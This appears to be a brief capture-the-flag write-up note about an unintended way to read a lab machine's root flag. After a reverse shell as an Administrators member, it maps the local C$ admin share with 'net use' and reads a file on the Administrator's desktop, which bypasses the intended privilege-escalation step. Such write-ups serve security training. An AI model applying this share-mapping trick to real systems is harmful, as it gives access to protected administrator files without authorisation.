# Unintended way to get root.txt

After getting a reverse shell with Batman and we know he is a member of Administrators we can just do the following:

```markdown
net use Z:\\127.0.0.1\c$
cd Z:
type C:\Users\Administrator\Desktop\root.txt
```
